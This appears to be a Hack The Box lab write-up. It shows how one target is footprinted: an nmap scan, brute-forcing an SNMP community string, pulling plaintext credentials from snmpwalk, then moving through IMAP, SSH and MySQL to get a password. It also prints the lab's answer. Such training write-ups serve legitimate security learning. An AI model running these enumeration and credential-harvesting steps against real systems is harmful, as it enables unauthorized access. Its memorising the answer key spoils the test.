# Hard
The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named HTB was also created here, whose credentials we need to access.

> Task: Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer. **Answer: cr3n4o7rzse7rzhnckhssncif7ds**

1. First perform a nmap scan (**also perform a UDP scan for full enumeration**):
```
$ sudo nmap -n -Pn --disable-arp-ping 10.129.169.58
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

$ sudo nmap -sV --top-port 100 -sU 10.129.169.58
PORT     STATE         SERVICE VERSION
68/udp   open|filtered dhcpc
161/udp  open          snmp    net-snmp; net-snmp SNMPv3 server
1022/udp open|filtered exp2
```
2. Since connecting to both POP3/IMAP needs valid credentials, let's first enumerate the SNMP service:
   - Guessing community string: found `backup`
    ```
    $ onesixtyone -c ~/SecLists/Discovery/SNMP/snmp.txt 10.129.46.117
    Scanning 1 hosts, 3219 communities
    10.129.46.117 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
    ```
   - Use snmpwalk to query OIDs with their information: found `tom:NMds732Js2761"` 
    ```
    $ snmpwalk -v2c -c backup 10.129.46.117
    ...
    iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
    iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
    ...
    ```
3. With `tom:NMds732Js2761"` log in to the IMAP service:
```
$ openssl s_client -connect 10.129.46.117:imaps
Connecting to 10.129.46.117
...
1 LOGIN tom NMds732Js2761
1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
1 LIST "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
1 OK List completed (0.010 + 0.000 + 0.009 secs).
1 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1 OK [READ-WRITE] Select completed (0.006 + 0.000 + 0.005 secs).
1 FETCH 1 all
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL))
1 OK Fetch completed (0.006 + 0.000 + 0.005 secs).
1 FETCH 1 BODY[TEXT]
* 1 FETCH (BODY[TEXT] {3430}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
...
-----END OPENSSH PRIVATE KEY-----
)
1 OK Fetch completed (0.001 + 0.000 secs).
```
4. Save the SSH key to `id_rsa` and connect to the target using SSH:
```
$ sudo chmod 600 id_rsa
$ ssh -i id_rsa tom@<ip>
```
5. Enumerate the target:
   - `ls -la` -> found `.mysql_history` showing that the target has also MySQL service enabled
   - `cat .bash_history` -> found `mysql -u tom -p` showing the command to connect to MySQL
   - Use the found credentials `tom:NMds732Js2761` to connect to MySQL and find the password for `HTB`:
   ```
   mysql> show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | information_schema |
   | mysql              |
   | performance_schema |
   | sys                |
   | users              |
   +--------------------+
   mysql> use users;
   mysql> show tables;
   +-----------------+
   | Tables_in_users |
   +-----------------+
   | users           |
   +-----------------+
   1 row in set (0.01 sec)

   mysql> show columns from users
       -> ;
   +----------+-------------+------+-----+---------+-------+
   | Field    | Type        | Null | Key | Default | Extra |
   +----------+-------------+------+-----+---------+-------+
   | id       | int         | YES  |     | NULL    |       |
   | username | varchar(50) | YES  |     | NULL    |       |
   | password | varchar(50) | YES  |     | NULL    |       |
   +----------+-------------+------+-----+---------+-------+
   3 rows in set (0.00 sec)

   mysql> select * from users where username = "HTB";
   +------+----------+------------------------------+
   | id   | username | password                     |
   +------+----------+------------------------------+
   |  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
   +------+----------+------------------------------+
   1 row in set (0.01 sec)
   ```

`Answer: cr3n4o7rzse7rzhnckhssncif7ds`